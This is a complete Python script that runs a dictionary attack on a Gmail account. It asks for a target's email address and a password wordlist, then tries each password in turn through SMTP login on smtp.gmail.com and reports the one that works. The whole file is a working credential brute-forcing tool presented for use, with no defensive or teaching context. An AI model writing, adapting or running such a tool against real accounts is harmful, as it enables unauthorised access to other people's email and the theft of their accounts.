#!/usr/bin/env python3
import smtplib
from colored import fg, attr

red = fg('1')
green = fg('2')
reset = attr('reset')

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[*] Enter Targets Email Address: ")
passwdfile = input("[*] Enter The Path To The Password File: ")
file = open(passwdfile, "r")

for password in file:
    password = password.strip('\n')
    try:
        smtpserver.login(user, password)
        print(f"{green}[+] Password Found: {password}{reset}")
        break
    except smtplib.SMTPAuthenticationError:
        print(f"{red}[-] Wrong Password: {password}{reset}")
